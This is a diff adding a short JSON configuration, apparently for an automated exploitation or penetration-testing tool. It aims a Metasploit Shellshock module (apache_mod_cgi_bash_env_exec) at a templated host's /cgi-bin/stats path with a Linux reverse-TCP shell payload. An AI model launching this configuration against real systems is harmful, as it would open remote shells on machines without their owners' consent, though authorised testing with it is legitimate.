@@ -1,0 +1,8 @@
+{
+"name": "shellshock",
+"remote_host": "{{.RHOST}}",
+"target_uri": "/cgi-bin/stats",
+"exploit": "multi/http/apache_mod_cgi_bash_env_exec",
+"payload": "linux/x86/shell/reverse_tcp",
+"reverse_shell": true
+}
